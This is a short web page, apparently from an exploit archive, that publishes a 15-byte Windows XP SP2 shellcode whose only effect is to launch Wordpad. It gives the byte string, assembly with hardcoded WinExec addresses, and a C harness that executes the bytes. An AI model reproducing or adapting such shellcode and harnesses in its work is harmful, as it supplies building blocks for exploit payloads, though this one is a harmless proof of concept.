<html><head><title>Windows - XP Pro Sp2 English Wordpad Shellcode - 15 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
+-------------------------------------------------+

| Windows XP Pro Sp2 English &quot;Wordpad&quot; Shellcode. |

+-------------------------------------------------+


Size  : 15 Bytes.
Author: Aodrulez. 
Email : f3arm3d3ar@gmail.com


Shellcode = &quot;\x6A\x05\x68\x97\x4C\x80\x7C\xB8&quot;
            &quot;\x4D\x11\x86\x7C\xFF\xD0\xCC&quot;;


+-----------+

| Asm Code: |

+-----------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

start:
      push 5
	push 7c804c97h    ;addr of &quot;write&quot; string in mem
	mov eax,7c86114dh ;addr of &quot;WinExec&quot; Function.
	call eax
	int 3h
end start

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~


+-----------------+

| Shellcodetest.c |

+-----------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

char code[] = &quot;\x6A\x05\x68\x97\x4C&quot;
              &quot;\x80\x7C\xB8\x4D\x11&quot;
              &quot;\x86\x7C\xFF\xD0\xCC&quot;;


int main(int argc, char **argv)
{
  int (*func)();
  func = (int (*)()) code;
  (int)(*func)();
}

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

+-------------------+

| Greetz Fly Out To |

+-------------------+

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~

1] Amforked()	 : My Mentor.
2] The Blue Genius : My Boss.
3] www.orchidseven.com
4] www.isacm.org.in

~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~     




<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
